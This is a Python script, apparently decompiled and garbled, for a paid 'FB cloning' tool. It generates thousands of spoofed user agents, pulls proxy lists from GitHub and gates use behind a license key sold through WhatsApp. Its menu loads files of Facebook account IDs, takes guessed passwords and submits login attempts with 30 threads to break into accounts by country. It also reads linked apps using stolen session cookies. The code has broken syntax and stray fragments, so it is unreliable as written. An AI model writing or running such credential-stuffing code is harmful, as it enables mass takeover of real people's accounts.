#Open-Sourced By Harry Akumaa.

fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana')
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from string import *
import bs4
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python ZISHAN.py')
print('[•] TOOL LOADING')
prox = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
open('proxies.txt', 'w').write(proxies)
except Exception:
    
    print('\x1b[1;95m[√] LOADING...')
    
    
    
    
proxies = open('proxies.txt', 'r').read().splitlines()
android_models = []
xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
for line in xx:
    android_models.append(line)
    usr = []
    xd = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
        gt = random.choice([
            'GT-1015',
            'GT-1020',
            'GT-1030',
            'GT-1035',
            'GT-1040',
            'GT-1045',
            'GT-1050',
            'GT-1240',
            'GT-1440',
            'GT-1450',
            'GT-18190',
            'GT-18262',
            'GT-19060I',
            'GT-19082',
            'GT-19083',
            'GT-19105',
            'GT-19152',
            'GT-19192',
            'GT-19300',
            'GT-19505',
            'GT-2000',
            'GT-20000',
            'GT-200s',
            'GT-3000',
            'GT-414XOP',
            'GT-6918',
            'GT-7010',
            'GT-7020',
            'GT-7030',
            'GT-7040',
            'GT-7050',
            'GT-7100',
            'GT-7105',
            'GT-7110',
            'GT-7205',
            'GT-7210',
            'GT-7240R',
            'GT-7245',
            'GT-7303',
            'GT-7310',
            'GT-7320',
            'GT-7325',
            'GT-7326',
            'GT-7340',
            'GT-7405',
            'GT-7550\t5GT-8005',
            'GT-8010',
            'GT-81',
            'GT-810',
            'GT-8105',
            'GT-8110',
            'GT-8220S',
            'GT-8410',
            'GT-9300',
            'GT-9320',
            'GT-93G',
            'GT-A7100',
            'GT-A9500',
            'GT-ANDROID',
            'GT-B2710',
            'GT-B5330',
            'GT-B5330B',
            'GT-B5330L',
            'GT-B5330ZKAINU',
            'GT-B5510',
            'GT-B5512',
            'GT-B5722',
            'GT-B7510',
            'GT-B7722',
            'GT-B7810',
            'GT-B9150',
            'GT-B9388',
            'GT-C3010',
            'GT-C3262',
            'GT-C3310R',
            'GT-C3312',
            'GT-C3312R',
            'GT-C3313T',
            'GT-C3322',
            'GT-C3322i',
            'GT-C3520',
            'GT-C3520I',
            'GT-C3592',
            'GT-C3595',
            'GT-C3782',
            'GT-C6712',
            'GT-E1282T',
            'GT-E1500',
            'GT-E2200',
            'GT-E2202',
            'GT-E2250',
            'GT-E2252',
            'GT-E2600',
            'GT-E2652W',
            'GT-E3210',
            'GT-E3309',
            'GT-E3309I',
            'GT-E3309T',
            'GT-G530H',
            'GT-g900f',
            'GT-G930F',
            'GT-H9500',
            'GT-I5508',
            'GT-I5801',
            'GT-I6410',
            'GT-I8150',
            'GT-I8160OKLTPA',
            'GT-I8160ZWLTTT',
            'GT-I8258',
            'GT-I8262D',
            'GT-I8268',
            'GT-I8505',
            'GT-I8530BAABTU',
            'GT-I8530BALCHO',
            'GT-I8530BALTTT',
            'GT-I8550E',
            'GT-i8700',
            'GT-I8750',
            'GT-I900',
            'GT-I9008L',
            'GT-i9040',
            'GT-I9080E',
            'GT-I9082C',
            'GT-I9082EWAINU',
            'GT-I9082i',
            'GT-I9100G',
            'GT-I9100LKLCHT',
            'GT-I9100M',
            'GT-I9100P',
            'GT-I9100T',
            'GT-I9105UANDBT',
            'GT-I9128E',
            'GT-I9128I',
            'GT-I9128V',
            'GT-I9158P',
            'GT-I9158V',
            'GT-I9168I',
            'GT-I9192I',
            'GT-I9195H',
            'GT-I9195L',
            'GT-I9250',
            'GT-I9303I',
            'GT-I9305N',
            'GT-I9308I',
            'GT-I9505G',
            'GT-I9505X',
            'GT-I9507V',
            'GT-I9600',
            'GT-m190',
            'GT-M5650',
            'GT-mini',
            'GT-N5000S',
            'GT-N5100',
            'GT-N5105',
            'GT-N5110',
            'GT-N5120',
            'GT-N7000B',
            'GT-N7005',
            'GT-N7100T',
            'GT-N7102',
            'GT-N7105',
            'GT-N7105T',
            'GT-N7108',
            'GT-N7108D',
            'GT-N8000',
            'GT-N8005',
            'GT-N8010',
            'GT-N8020',
            'GT-N9000',
            'GT-N9505',
            'GT-P1000CWAXSA',
            'GT-P1000M',
            'GT-P1000T',
            'GT-P1010',
            'GT-P3100B',
            'GT-P3105',
            'GT-P3108',
            'GT-P3110',
            'GT-P5100',
            'GT-P5200',
            'GT-P5210XD1',
            'GT-P5220',
            'GT-P6200',
            'GT-P6200L',
            'GT-P6201',
            'GT-P6210',
            'GT-P6211',
            'GT-P6800',
            'GT-P7100',
            'GT-P7300',
            'GT-P7300B',
            'GT-P7310',
            'GT-P7320',
            'GT-P7500D',
            'GT-P7500M',
            'GT-P7500R',
            'GT-P7500V',
            'GT-P7501',
            'GT-P7511',
            'GT-S3330',
            'GT-S3332',
            'GT-S3333',
            'GT-S3370',
            'GT-S3518',
            'GT-S3570',
            'GT-S3600i',
            'GT-S3650',
            'GT-S3653W',
            'GT-S3770K',
            'GT-S3770M',
            'GT-S3800W',
            'GT-S3802',
            'GT-S3850',
            'GT-S5220',
            'GT-S5220R',
            'GT-S5222',
            'GT-S5230',
            'GT-S5230W',
            'GT-S5233T',
            'GT-s5233w',
            'GT-S5250',
            'GT-S5253',
            'GT-s5260',
            'GT-S5280',
            'GT-S5282',
            'GT-S5283B',
            'GT-S5292',
            'GT-S5300',
            'GT-S5300L',
            'GT-S5301',
            'GT-S5301B',
            'GT-S5301L',
            'GT-S5302',
            'GT-S5302B',
            'GT-S5303',
            'GT-S5303B',
            'GT-S5310',
            'GT-S5310B',
            'GT-S5310C',
            'GT-S5310E',
            'GT-S5310G',
            'GT-S5310I',
            'GT-S5310L',
            'GT-S5310M',
            'GT-S5310N',
            'GT-S5312',
            'GT-S5312B',
            'GT-S5312C',
            'GT-S5312L',
            'GT-S5330',
            'GT-S5360',
            'GT-S5360B',
            'GT-S5360L',
            'GT-S5360T',
            'GT-S5363',
            'GT-S5367',
            'GT-S5369',
            'GT-S5380',
            'GT-S5380D',
            'GT-S5500',
            'GT-S5560',
            'GT-S5560i',
            'GT-S5570B',
            'GT-S5570I',
            'GT-S5570L',
            'GT-S5578',
            'GT-S5600',
            'GT-S5603',
            'GT-S5610',
            'GT-S5610K',
            'GT-S5611',
            'GT-S5620',
            'GT-S5670',
            'GT-S5670B',
            'GT-S5670HKBZTA',
            'GT-S5690',
            'GT-S5690R',
            'GT-S5830',
            'GT-S5830D',
            'GT-S5830G',
            'GT-S5830i',
            'GT-S5830L',
            'GT-S5830M',
            'GT-S5830T',
            'GT-S5830V',
            'GT-S5831i',
            'GT-S5838',
            'GT-S5839i',
            'GT-S6010',
            'GT-S6010BBABTU',
            'GT-S6012',
            'GT-S6012B',
            'GT-S6102',
            'GT-S6102B',
            'GT-S6293T',
            'GT-S6310B',
            'GT-S6310ZWAMID',
            'GT-S6312',
            'GT-S6313T',
            'GT-S6352',
            'GT-S6500',
            'GT-S6500D',
            'GT-S6500L',
            'GT-S6790',
            'GT-S6790L',
            'GT-S6790N',
            'GT-S6792L',
            'GT-S6800',
            'GT-S6800HKAXFA',
            'GT-S6802',
            'GT-S6810',
            'GT-S6810B',
            'GT-S6810E',
            'GT-S6810L',
            'GT-S6810M',
            'GT-S6810MBASER',
            'GT-S6810P',
            'GT-S6812',
            'GT-S6812B',
            'GT-S6812C',
            'GT-S6812i',
            'GT-S6818',
            'GT-S6818V',
            'GT-S7230E',
            'GT-S7233E',
            'GT-S7250D',
            'GT-S7262',
            'GT-S7270',
            'GT-S7270L',
            'GT-S7272',
            'GT-S7272C',
            'GT-S7273T',
            'GT-S7278',
            'GT-S7278U',
            'GT-S7390',
            'GT-S7390G',
            'GT-S7390L',
            'GT-S7392',
            'GT-S7392L',
            'GT-S7500',
            'GT-S7500ABABTU',
            'GT-S7500ABADBT',
            'GT-S7500ABTTLP',
            'GT-S7500CWADBT',
            'GT-S7500L',
            'GT-S7500T',
            'GT-S7560',
            'GT-S7560M',
            'GT-S7562',
            'GT-S7562C',
            'GT-S7562i',
            'GT-S7562L',
            'GT-S7566',
            'GT-S7568',
            'GT-S7568I',
            'GT-S7572',
            'GT-S7580E',
            'GT-S7583T',
            'GT-S758X',
            'GT-S7592',
            'GT-S7710',
            'GT-S7710L',
            'GT-S7898',
            'GT-S7898I',
            'GT-S8500',
            'GT-S8530',
            'GT-S8600',
            'GT-STB919',
            'GT-T140',
            'GT-T150',
            'GT-V8a',
            'GT-V8i',
            'GT-VC818',
            'GT-VM919S',
            'GT-W131',
            'GT-W153',
            'GT-X831',
            'GT-X853',
            'GT-X870',
            'GT-X890',
            'GT-Y8750'])
        ugen = []
        for xd in range(10000):
    try:
            aa = 'Mozilla/5.0 (Linux; U; Android'
            b = random.choice([
                '6',
                '7',
                '8',
                '9',
                '10',
                '11',
                '12',
                '13'])
            c = f' en-us; {str(gt)}'
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(73, 100)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uaku2 = f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
            ugen.append(uaku2)
            for agent in range(10000):
    try:
                aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
                b = random.choice([
                    '6',
                    '7',
                    '8',
                    '9',
                    '10',
                    '11',
                    '12',
                    '13'])
                c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
                d = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                e = random.randrange(1, 999)
                f = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
                h = random.randrange(73, 100)
                i = '0'
                j = random.randrange(4200, 4900)
                k = random.randrange(40, 150)
                l = 'Mobile Safari/533.1'
                fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                ugen.append(fullagnt)
                rug = []
                for nt in range(10000):
    try:
                    rr = random.randint
                    aZ = random.choice([
                        'A',
                        'B',
                        'C',
                        'D',
                        'E',
                        'F',
                        'G',
                        'H',
                        'I',
                        'J',
                        'K',
                        'L',
                        'M',
                        'N',
                        'O',
                        'P',
                        'Q',
                        'R',
                        'S',
                        'T',
                        'U',
                        'V',
                        'W',
                        'X',
                        'Y',
                        'Z'])
                    rx = random.randrange(1, 999)
                    xx = f'Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'
                    rug.append(xx)
                    ruz = []
                    for mtc in range(10000):
    try:
                        rr = random.randint
                        xd = f'Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7, 15))} {str(rr(7, 15))}_{str(rr(1, 9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99, 199))}.0.{str(rr(3999, 4999))}.{str(rr(99, 150))} Safari/537.36 OPR/{str(rr(99, 199))}.0.{str(rr(3999, 4999))}.{str(rr(99, 150))}'
                        ruz.append(xd)
                        ugen = []
                        for agent in range(10000):
    try:
                            aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
                            b = random.choice([
                                '6',
                                '7',
                                '8',
                                '9',
                                '10',
                                '11',
                                '12'])
                            c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
                            d = random.choice([
                                'A',
                                'B',
                                'C',
                                'D',
                                'E',
                                'F',
                                'G',
                                'H',
                                'I',
                                'J',
                                'K',
                                'L',
                                'M',
                                'N',
                                'O',
                                'P',
                                'Q',
                                'R',
                                'S',
                                'T',
                                'U',
                                'V',
                                'W',
                                'X',
                                'Y',
                                'Z'])
                            e = random.randrange(1, 999)
                            f = random.choice([
                                'A',
                                'B',
                                'C',
                                'D',
                                'E',
                                'F',
                                'G',
                                'H',
                                'I',
                                'J',
                                'K',
                                'L',
                                'M',
                                'N',
                                'O',
                                'P',
                                'Q',
                                'R',
                                'S',
                                'T',
                                'U',
                                'V',
                                'W',
                                'X',
                                'Y',
                                'Z'])
                            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
                            h = random.randrange(73, 100)
                            i = '0'
                            j = random.randrange(4200, 4900)
                            k = random.randrange(40, 150)
                            l = 'Mobile Safari/533.1'
                            fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                            ugen.append(fullagnt)
                            ugenR = []
                            for agent in range(10000):
    try:
                                aa = 'Mozilla/5.0 (Linux; Android 7.1.2;'
                                b = random.choice([
                                    '6',
                                    '7',
                                    '8',
                                    '9',
                                    '10',
                                    '11',
                                    '12',
                                    '13',
                                    '14',
                                    '15',
                                    '16',
                                    '17'])
                                c = 'vivo Y66i A Build/N2G47H; wv/'
                                d = random.choice([
                                    'A',
                                    'B',
                                    'C',
                                    'D',
                                    'E',
                                    'F',
                                    'G',
                                    'H',
                                    'I',
                                    'J',
                                    'K',
                                    'L',
                                    'M',
                                    'N',
                                    'O',
                                    'P',
                                    'Q',
                                    'R',
                                    'S',
                                    'T',
                                    'U',
                                    'V',
                                    'W',
                                    'X',
                                    'Y',
                                    'Z'])
                                e = random.randrange(1, 11111)
                                f = random.choice([
                                    'A',
                                    'B',
                                    'C',
                                    'D',
                                    'E',
                                    'F',
                                    'G',
                                    'H',
                                    'I',
                                    'J',
                                    'K',
                                    'L',
                                    'M',
                                    'N',
                                    'O',
                                    'P',
                                    'Q',
                                    'R',
                                    'S',
                                    'T',
                                    'U',
                                    'V',
                                    'W',
                                    'X',
                                    'Y',
                                    'Z'])
                                g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73;'
                                h = random.randrange(84, 200)
                                i = '0'
                                j = random.randrange(4400, 4900)
                                k = random.randrange(50, 200)
                                l = 'Mobile Safari/537.36'
                                fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                                ugenR.append(fullagnt)
                                ugen1 = []
                                for agent in range(10000):
    try:
                                    aa = 'Mozilla/5.0 (Linux; Android 7.1.2;'
                                    b = random.choice([
                                        '6',
                                        '7',
                                        '8',
                                        '9',
                                        '10',
                                        '11',
                                        '12'])
                                    c = ' vivo Y66i A Build/N2G47H; wv/'
                                    d = random.choice([
                                        'A',
                                        'B',
                                        'C',
                                        'D',
                                        'E',
                                        'F',
                                        'G',
                                        'H',
                                        'I',
                                        'J',
                                        'K',
                                        'L',
                                        'M',
                                        'N',
                                        'O',
                                        'P',
                                        'Q',
                                        'R',
                                        'S',
                                        'T',
                                        'U',
                                        'V',
                                        'W',
                                        'X',
                                        'Y',
                                        'Z'])
                                    e = random.randrange(1, 11111)
                                    f = random.choice([
                                        'A',
                                        'B',
                                        'C',
                                        'D',
                                        'E',
                                        'F',
                                        'G',
                                        'H',
                                        'I',
                                        'J',
                                        'K',
                                        'L',
                                        'M',
                                        'N',
                                        'O',
                                        'P',
                                        'Q',
                                        'R',
                                        'S',
                                        'T',
                                        'U',
                                        'V',
                                        'W',
                                        'X',
                                        'Y',
                                        'Z'])
                                    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73;'
                                    h = random.randrange(83, 100)
                                    i = '0'
                                    j = random.randrange(4400, 7900)
                                    k = random.randrange(50, 250)
                                    l = 'Mobile Safari/537.36'
                                    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                                    ugen1.append(fullagnt)
                                    ugen2 = []
                                    for agent in range(10000):
    try:
                                        aa = 'Mozilla/5.0 (Linux; Android 11;'
                                        b = random.choice([
                                            '6',
                                            '7',
                                            '8',
                                            '9',
                                            '10',
                                            '11',
                                            '12',
                                            '13',
                                            '14',
                                            '15',
                                            '16',
                                            '17'])
                                        c = 'V2023 Build/RP1A.200720.012; wv/'
                                        d = random.choice([
                                            'A',
                                            'B',
                                            'C',
                                            'D',
                                            'E',
                                            'F',
                                            'G',
                                            'H',
                                            'I',
                                            'J',
                                            'K',
                                            'L',
                                            'M',
                                            'N',
                                            'O',
                                            'P',
                                            'Q',
                                            'R',
                                            'S',
                                            'T',
                                            'U',
                                            'V',
                                            'W',
                                            'X',
                                            'Y',
                                            'Z'])
                                        e = random.randrange(1, 111111)
                                        f = random.choice([
                                            'A',
                                            'B',
                                            'C',
                                            'D',
                                            'E',
                                            'F',
                                            'G',
                                            'H',
                                            'I',
                                            'J',
                                            'K',
                                            'L',
                                            'M',
                                            'N',
                                            'O',
                                            'P',
                                            'Q',
                                            'R',
                                            'S',
                                            'T',
                                            'U',
                                            'V',
                                            'W',
                                            'X',
                                            'Y',
                                            'Z'])
                                        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85;'
                                        h = random.randrange(83, 200)
                                        i = '0'
                                        j = random.randrange(4400, 6900)
                                        k = random.randrange(40, 200)
                                        l = 'Mobile Safari/537.36'
                                        fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                                        ugen2.append(fullagnt)
                                        sim_id = ''
                                        android_version = subprocess.check_output('getprop ro.build.version.release', shell = True).decode('utf-8').replace('\n', '')
                                        model = subprocess.check_output('getprop ro.product.model', shell = True).decode('utf-8').replace('\n', '')
                                        build = subprocess.check_output('getprop ro.build.id', shell = True).decode('utf-8').replace('\n', '')
                                        fblc = ('en_GB', 'en_US')
                                        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
                                        fbcr = 'Zong'
                                        fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell = True).decode('utf-8').replace('\n', '')
                                        fbbd = subprocess.check_output('getprop ro.product.brand', shell = True).decode('utf-8').replace('\n', '')
                                        fbdv = model
                                        fbsv = android_version
                                        fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell = True).decode('utf-8').replace(',', ':').replace('\n', '')
                                        fbdm = '{density=2.0,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell = True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell = True).decode('utf-8').replace('\n', '')
                                        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')
                                        total = 0
                                        for i in fbcr:
                                            total += 1
                                            select = ('1', '2')
                                            if select == '1':
                                                fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
                                                sim_id += fbcr
if select == '2':
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[1].replace('\n', '')
    sim_id += fbcr
    except Exception:
        
        fbcr = 'Zong'
        sim_id += fbcr
        
        
        
        
fbcr = 'Zong'
sim_id += fbcr
fbcr = 'Zong'
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm }
os.system('xdg-open https://chat.whatsapp.com/HyReTYBNYWeJVSWCPGIJVZ')
logo = "\x1b[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\x1b[1;37m๑۩♡۩๑\x1b[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n\x1b[0;92m\n                                                     \n \x1b[1;33m8888888888',8888' `8.`8888.      ,8' 8 888888888o   \n \x1b[1;33m        ,8',8888'   `8.`8888.    ,8'  8 8888    `88. \n \x1b[1;33m       ,8',8888'     `8.`8888.  ,8'   8 8888     `88 \n  \x1b[1;33m    ,8',8888'       `8.`8888.,8'    8 8888     ,88 \n\x1b[1;31m     ,8',8888'         `8.`88888'     8 8888.   ,88' \n\x1b[1;31m    ,8',8888'          .88.`8888.     8 8888888888   \n\x1b[1;31m   ,8',8888'          .8'`8.`8888.    8 8888    `88. \n\x1b[1;33m  ,8',8888'          .8'  `8.`8888.   8 8888      88 \n\x1b[1;33m ,8',8888'          .8'    `8.`8888.  8 8888    ,88' \n\x1b[1;33m,8',8888888888888  .8'      `8.`8888. 8 888888888P   \n                                                      \n\x1b[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\x1b[1;37m๑۩♡۩๑\x1b[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n\x1b[1;91m\x1b[1;41m\x1b[1;97m              WELCOME TO Z X B TOOLS               \x1b[;0m\x1b[1;91m\x1b[1;92m\n╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[0;44m[There Is Nothing Wrong With Change If It Is In The Right Way]\x1b[0;92m║\n╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[0;41m    [ WORKING ON MOBILE DATA + WIFI]       \x1b[0;92m║\n╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m \n╠══[Author                   • \x1b[1;38mZISHAN-BALOCH]\x1b[1;38m  ║\x1b[1;31m \n╠══[Facebook                 • ZISHAN BALOCH]    ║  \x1b[1;97m  \n╠══[Github                   • \x1b[1;38mZESHANHASHIR]      ║\x1b[1;34m   \n╠══[Whatsapp                 • NOT AVAILABLE] ║\x1b[1;35m \n╠══[TOOLS                    • PAID]          ║ \x1b[1;32m   \n╠══[VERSION                  • 8.1 ]            ║\x1b[1;35m \n\x1b[1;37m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[1;37m "

def linex():
    try:
    print('\x1b[1;37m--------------------------------------------------')


def clear():
    try:
    os.system('clear')
    print(logo)

A = '\x1b[1;97m'
B = '\x1b[1;96m'
C = '\x1b[1;91m'
D = '\x1b[1;92m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
N = '\x1b[1;37m'
E = '\x1b[1;93m'
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\x1b[1;37m'

def cek_apk(session, coki):
    try:
    w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
        'cookie': coki }).text
    sop = BeautifulSoup(w, 'html.parser')
    x = sop.find('form', method = 'post')
    game = x.find_all('h3')()
    if len(game) == 0:
        print('\r%s [%s•%s] %sActive Apks & Web Not Found %s\t\t' % (N, H, N, H, N))
    print(f'\r{A} [•]%s Active Apks & Web 👇 ' % H)
    for i in range(len(game)):
    try:
        print('\r%s [%s] %s %s ' % (D, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), D))
        w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
            'cookie': coki }).text
        sop = BeautifulSoup(w, 'html.parser')
        x = sop.find('form', method = 'post')
        game = x.find_all('h3')()
        if len(game) == 0:
            print('\r%s [%s•%s] %sExpired Apks & Web Not Found %s\t\t' % (N, M, N, M, N))
            
        ([ i.text ])(f'\r{A} [•]%s Expired Apks & Web 👇 ' % M)
        for i in range(len(game)):
    try:
            print('\r%s [%s] %s %s ' % (C, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), A))
            

loop = 0
oks = []
cps = []
pcp = []
id = []
tokenku = []

def loginkey():
    try:
    os.system('clear')
    print(logo)
    uuid = str(os.geteuid())
    Xyteee = f'BOSS1x6b7b5c{uuid!s}85b8n9nfdi{uuid!s}'
    print(logo)
    os.system('clear')
    print(logo)
    print(' Your Key : \x1b[1;31m' + Xyteee)
    print('\x1b[1;92m--------------------------------------------------')
    system = requests.get('https://github.com/zeshanhashir/Hashir_Z/blob/main/Hashir_ZS').text
    if Xyteee in system:
        print()
        msg = str(os.geteuid())
        time.sleep(1)
        menu()
    print('\x1b[1;92m Now it will work well in all countries')
    print('\x1b[1;92m-----------------------------------------------------\x1b[1;97m')
    print('\x1b[1;92m-----------------------------------------------------\x1b[1;97m')
    print('\x1b[1;92m [\x1b[1;92m1\x1b[1;92m]\x1b[1;92m 8$ \x1b[1;92mApproval For 1 month')
    print(' \x1b[1;92m[\x1b[1;92m2\x1b[1;92m]\x1b[1;92m 6$ \x1b[1;92mApproval For 15 days')
    print(' \x1b[1;92m[\x1b[1;92m3\x1b[1;92m]\x1b[1;92m 3$ \x1b[1;92mApproval For 7 days \x1b[1;37m')
    print('\x1b[1;92m-----------------------------------------------------')
    Picchi = input(' Press enter : ')
    os.system('clear')
    print(logo)
    print(f' \x1b[1;92mYour Key :\x1b[31;1m{Xyteee}')
    print('\x1b[1;92m Tools    : FB Cloning')
    print(' \x1b[1;92m\n \x1b[1;92m\x1b[1;92mNote: THIS IS FREE TOOLS\x1b[0;0m')
    print('\n\x1b[1;92m [•] File Crack \x1b[1;92m\n [•] Random Crack \n [•] Exit Program')
    print('-----------------------------------------------------')
    url_wa = 'https://api.whatsapp.com/send?phone=+923068237659&text='
    choice = input(' Enter your choice  : ')
    tks = 'Hi BOSS Sir, I Need To Buy Your BOSS Tools  Please Approve My Key To Premium\n\n Name : ' + choice + '\n Key : ' + Xyteee + '\n Buy Select : ' + Picchi
    subprocess.check_output([
        'am',
        'start',
        url_wa + tks])
    time.sleep(2)
    print('-----------------------------------------------------\n Run again with permission from admin')
    loginkey()
    sys.exit()
    rhu.submit(loginkey)


def cek_apk(session, coki):
    try:
    w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
        'cookie': coki }).text
    sop = BeautifulSoup(w, 'html.parser')
    x = sop.find('form', method = 'post')
    game = x.find_all('h3')()
    if len(game) == 0:
        print('\r%s [%s•%s] %sActive Apks & Web Not Found %s        ' % (N, H, N, H, N))
    print(f'\r{A} [•]%s Active Apks & Web 👇 ' % H)
    for i in range(len(game)):
    try:
        print('\r%s [%s] %s %s ' % (D, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), D))
        w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
            'cookie': coki }).text
        sop = BeautifulSoup(w, 'html.parser')
        x = sop.find('form', method = 'post')
        game = x.find_all('h3')()
        if len(game) == 0:
            print('\r%s [%s•%s] %sExpired Apks & Web Not Found %s        ' % (N, M, N, M, N))
            
        ([ i.text ])(f'\r{A} [•]%s Expired Apks & Web 👇 ' % M)
        for i in range(len(game)):
    try:
            print('\r%s [%s] %s %s ' % (C, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), A))
            


def menu():
    try:
    clear()
    print(' [1] File cloning\n [2] Pak cloning\n [3] INDIA Cloning\n [4] Afghan Cloning\n [5] Bangladesh Cloning \n [6] Gmail cloning  \n [0] Exit menu')
    linex()
    xd = input(' Choose an option: ')
    if xd in ('1', '01'):
    try:
        clear()
        print(' Put file example:  /sdcard/File.txt  etc..')
        linex()
        file = input(' Put file path\x1b[1;37m: ')
        fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            print(' File location not found ')
            time.sleep(1)
            menu()
        clear()
        print(' All method working ')
        linex()
        print(' [1] METHOD (NEW ID)')
        print(' [2] METHOD (MIX)')
        linex()
        mthd = input(' Choose: ')
        linex()
        plist = []
        ps_limit = int(input(' How many passwords do you want to add ? '))
        ps_limit = 1
        clear()
        print('\x1b[1;32m exp: first last,firtslast,first123')
        linex()
        for i in range(ps_limit):
    try:
            plist.append(input(f' Put password {i + 1}: '))
            clear()
            print(' Do you went show cp account? (y/n):
    try: ')
            linex()
            cx = input(' Choose: ')
            if cx in ('y', 'Y', 'yes', 'Yes', '1'):
    try:
                pcp.append('y')
        pcp.append('n')
        crack_submit = tred(max_workers = 30)
        clear()
        total_ids = str(len(fo))
        print(' Total account ids : \x1b[1;32m' + total_ids + ' ')
        linex()
        for user in fo:
            (ids, names) = user.split('|')
            passlist = plist
            if mthd in ('1', '01'):
    try:
                crack_submit.submit(api1, ids, names, passlist)
            if mthd in ('2', '02'):
    try:
                crack_submit.submit(api2, ids, names, passlist)
            
            
        print('\x1b[1;37m')
        linex()
        print(' The process has completed')
        print(' Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        linex()
        input(' Press enter to back ')
        os.system('python ZISHAN.py')
        
